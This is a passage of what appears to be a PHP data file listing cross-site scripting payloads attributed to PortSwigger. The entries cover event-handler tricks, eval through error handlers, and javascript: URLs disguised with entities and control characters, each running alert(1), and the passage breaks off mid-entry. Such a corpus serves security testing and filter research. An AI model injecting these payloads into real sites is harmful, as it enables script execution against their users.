            'portswigger-343' => [
                'payload' => '<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-344' => [
                'payload' => '<script>onpageswap=setTimeout;location=\'x\';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-345' => [
                'payload' => '<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags=\'.call\\x28alert\\x281\\x29\\x29\';Event.prototype.toString=/x/.toString</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-346' => [
                'payload' => '<script>onscroll=setTimeout;document.body.style.height=\'9999px\';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-347' => [
                'payload' => '<script>onscrollend=setTimeout;document.body.style.height=\'9999px\';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-348' => [
                'payload' => '<input value=x autofocus onfocus="window.onselect=setTimeout;this.selectionStart=1;Event.prototype.toString=TypeError.prototype.toString;Event.prototype.message=\'alert\\x281\\x29\'">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-349' => [
                'payload' => '<img/src/style=transition:0.1s onerror="window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>\'alert\\x281\\x29\'">',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-350' => [
                'payload' => '<img/src/onerror="window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'">',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-351' => [
                'payload' => '<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name=\'alert\\x281\\x29\'>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-352' => [
                'payload' => '<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=\';alert\\x281\\x29;var\\x20Uncaught//\';z>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-353' => [
                'payload' => '<svg onload=onerror=eval;new\'"-alert\\x281\\x29//\'>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-354' => [
                'payload' => '<script>onerror=eval,new name</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-355' => [
                'payload' => '<script>throw onerror=eval,x=new Error,x.message=\'alert\\x281\\x29\',x</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-356' => [
                'payload' => '<script>throw onerror=eval,x=new Error,x.name=\'\',x.message=\'=alert\\x281\\x29\',x</script>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-357' => [
                'payload' => '<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-358' => [
                'payload' => '<script>window.name=\'alert(1)\';</script><svg onload="attributes[0].value=name,new onload">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-359' => [
                'payload' => '<svg onload="attributes[0].value=id+URL+id,new onload" id=`>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-360' => [
                'payload' => '<input onfocus="attributes[0].value=id+URL+id,new onfocus" id=` autofocus>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-361' => [
                'payload' => '<input onclick=attributes[0].value=\'`\'+URL+\'`\'>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-362' => [
                'payload' => '<form><input onclick="formAction=top.name,type=\'submit\',new submit">',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-363' => [
                'payload' => '<svg onload=innerHTML=URL,innerHTML=textContent>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-364' => [
                'payload' => '<img/src/onerror=innerHTML=URL,innerHTML=textContent>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-365' => [
                'payload' => '<svg onload=innerHTML=URL,eval(textContent)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-366' => [
                'payload' => '<svg onload=outerHTML=id id=<img/src/onerror=alert(1)&gt;',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-367' => [
                'payload' => 'alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-368' => [
                'payload' => '\'-prompt(1)-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-369' => [
                'payload' => '\'-confirm(1)-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-370' => [
                'payload' => '\'-alert`1`-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-371' => [
                'payload' => '\';throw onerror=alert,1;\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-372' => [
                'payload' => '\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-373' => [
                'payload' => 'throw onerror=alert,1',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-374' => [
                'payload' => '\'-[location=\'javascript:alert%281%29\']-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-375' => [
                'payload' => '\'-[location=\'javascript:alert\\x281\\x29\']-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-376' => [
                'payload' => '\'-[location=\'javascript:alert\\u00281\\u0029\']-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-377' => [
                'payload' => '\'-[location=\'javascript:alert\\501\\51\']-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-378' => [
                'payload' => '\'-[\'alert\\x281\\x29\'instanceof{[Symbol.hasInstance]:eval}]-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-379' => [
                'payload' => '\'-alert(1)-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-380' => [
                'payload' => '&apos;-alert(1)-&apos;',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-381' => [
                'payload' => '&#x27;-alert(1)-&#x27;',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-382' => [
                'payload' => '&#39;-alert(1)-&#39;',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-383' => [
                'payload' => '&#x27-alert(1)-&#x27',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-384' => [
                'payload' => '&#39-alert(1)-&#39',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-385' => [
                'payload' => 'javaScript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-386' => [
                'payload' => 'java',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-387' => [
                'payload' => 'script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-388' => [
                'payload' => 'java	script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-389' => [
                'payload' => 'javascript&colon;alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-390' => [
                'payload' => 'javascript&#58;alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-391' => [
                'payload' => 'javascript&#58alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-392' => [
                'payload' => 'javascript&#x3a;alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-393' => [
                'payload' => 'javascript&#x3a-alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-394' => [
                'payload' => 'java&NewLine;script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-395' => [
                'payload' => 'java&Tab;script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-396' => [
                'payload' => 'java&#x9;script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-397' => [
                'payload' => 'java&#x00000000000009;script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-398' => [
                'payload' => 'java&#9;script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-399' => [
                'payload' => 'java&#00000000000009;script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-400' => [
                'payload' => 'java&#x9script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-401' => [
                'payload' => 'java&#x00000000000009script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-402' => [
                'payload' => 'java&#9script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-403' => [
                'payload' => 'java&#00000000000009script:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-404' => [
                'payload' => '&NewLine;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-405' => [
                'payload' => '&Tab;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-406' => [
                'payload' => 'javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-407' => [
                'payload' => '%09javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-408' => [
                'payload' => '%20javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-409' => [
                'payload' => '&#1;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-410' => [
                'payload' => '&#2;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-411' => [
                'payload' => '&#3;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-412' => [
                'payload' => '&#4;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-413' => [
                'payload' => '&#5;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-414' => [
                'payload' => '&#6;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-415' => [
                'payload' => '&#7;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-416' => [
                'payload' => '&#8;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-417' => [
                'payload' => '&#9;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-418' => [
                'payload' => '&#10;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-419' => [
                'payload' => '&#11;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-420' => [
                'payload' => '&#12;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-421' => [
                'payload' => '&#13;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-422' => [
                'payload' => '&#14;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-423' => [
                'payload' => '&#15;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-424' => [
                'payload' => '&#16;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-425' => [
                'payload' => '&#17;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-426' => [
                'payload' => '&#18;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-427' => [
                'payload' => '&#19;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-428' => [
                'payload' => '&#20;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-429' => [
                'payload' => '&#21;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-430' => [
                'payload' => '&#22;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-431' => [
                'payload' => '&#23;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-432' => [
                'payload' => '&#24;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-433' => [
                'payload' => '&#25;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-434' => [
                'payload' => '&#26;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-435' => [
                'payload' => '&#27;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-436' => [
                'payload' => '&#28;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-437' => [
                'payload' => '&#29;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-438' => [
                'payload' => '&#30;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-439' => [
                'payload' => '&#31;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-440' => [
                'payload' => '&#x1;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-441' => [
                'payload' => '&#x2;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-442' => [
                'payload' => '&#x3;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-443' => [
                'payload' => '&#x4;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-444' => [
                'payload' => '&#x5;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-445' => [
                'payload' => '&#x6;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-446' => [
                'payload' => '&#x7;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-447' => [
                'payload' => '&#x8;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-448' => [
                'payload' => '&#x9;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-449' => [
                'payload' => '&#xa;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-450' => [
                'payload' => '&#xb;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-451' => [
                'payload' => '&#xc;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-452' => [
                'payload' => '&#xd;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-453' => [
                'payload' => '&#xe;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-454' => [
                'payload' => '&#xf;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-455' => [
                'payload' => '&#x10;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-456' => [
                'payload' => '&#x11;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-457' => [
                'payload' => '&#x12;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-458' => [
                'payload' => '&#x13;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-459' => [
                'payload' => '&#x14;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-460' => [
                'payload' => '&#x15;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-461' => [
                'payload' => '&#x16;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-462' => [
                'payload' => '&#x17;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-463' => [
                'payload' => '&#x18;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-464' => [
                'payload' => '&#x19;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-465' => [
                'payload' => '&#x1a;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-466' => [
                'payload' => '&#x1b;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-467' => [
                'payload' => '&#x1c;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-468' => [
                'payload' => '&#x1d;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-469' => [
                'payload' => '&#x1e;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-470' => [
                'payload' => '&#x1f;javascript:alert(1)',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-471' => [
                'payload' => '\'-[s=document.createElement(\'script\'),s.append(\'a\'+\'lert(1)\'),document.documentElement.append(s)]-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-472' => [
                'payload' => '\'-location.replace(\'javascript:a\\lert(1)\')-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-473' => [
                'payload' => '\'-[location=\'javascript:a\\lert(1)\']-\'',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-474' => [
                'payload' => '"/onfocus=alert(1) tabindex=1 autofocus/',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-475' => [
                'payload' => '"/onfocusin=alert(1) tabindex=1 autofocus/',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-476' => [
                'payload' => '"/onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-477' => [
                'payload' => '"/onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-478' => [
                'payload' => '"/onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-479' => [
                'payload' => '"/onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-480' => [
                'payload' => '"/onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-481' => [
                'payload' => '"/onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-482' => [
                'payload' => '"/onmousedown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-483' => [
                'payload' => '"/onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-484' => [
                'payload' => '"/onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-485' => [
                'payload' => '"/onfocus=alert(1) autofocus/',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-486' => [
                'payload' => '"/onfocusin=alert(1) autofocus/',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-487' => [
                'payload' => '1 onfocus=alert(1) autofocus/',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-488' => [
                'payload' => '1 onfocusin=alert(1) autofocus/',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-489' => [
                'payload' => '1 onmousemove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-490' => [
                'payload' => '1 onmouseenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-491' => [
                'payload' => '1 onpointerenter=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-492' => [
                'payload' => '1 onpointermove=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-493' => [
                'payload' => '1 onpointerover=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-494' => [
                'payload' => '1 onpointerrawupdate=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-495' => [
                'payload' => '1 onmouseup=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-496' => [
                'payload' => '1 onpointerdown=alert(1) style=position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0 /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-497' => [
                'payload' => '"onfocus="alert(1)"/autofocus/',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-498' => [
                'payload' => '"onfocusin="alert(1)"/autofocus/',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-499' => [
                'payload' => '"onmousemove="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-500' => [
                'payload' => '"onmouseenter="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-501' => [
                'payload' => '"onpointerenter="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-502' => [
                'payload' => '"onpointermove="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-503' => [
                'payload' => '"onpointerover="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-504' => [
                'payload' => '"onpointerrawupdate="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-505' => [
                'payload' => '"onmouseup="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-506' => [
                'payload' => '"onpointerdown="alert(1)"style="position:fixed;width:100vw;height:100vh;z-index:100000;left:0;top:0" /',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-507' => [
                'payload' => '" srcdoc="<xss tabindex=1 autofocus onfocusin=alert(1)>"',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-508' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=atob.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-509' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=btob.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-510' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=Ink.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-511' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=HID.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-512' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=GPU.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-513' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=when.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-514' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=find.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-515' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=print.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-516' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=Set.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-517' => [
                'payload' => '<xss tabindex=1 autofocus onfocus={}.constructor.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-518' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=\'\'.constructor.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-519' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=[].constructor.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-520' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=0..constructor.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-521' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=0n.constructor.constructor(\'a\'+\'lert(1)\')()>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-522' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=s=createElement(\'script\'),s.append(\'a\'+\'lert(1)\'),this.append(s)>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-523' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=location.replace(\'javascript:a\\lert(1)\')>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-524' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=location=\'javascript:a\\lert(1)\'>',
                'attribution' => 'PortSwigger',
                'url_shaped' => true,
            ],
            'portswigger-525' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=location=self.name>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-526' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=location=frames.name>',
                'attribution' => 'PortSwigger',
                'url_shaped' => false,
            ],
            'portswigger-527' => [
                'payload' => '<xss tabindex=1 autofocus onfocus=location=globalThis.name>',
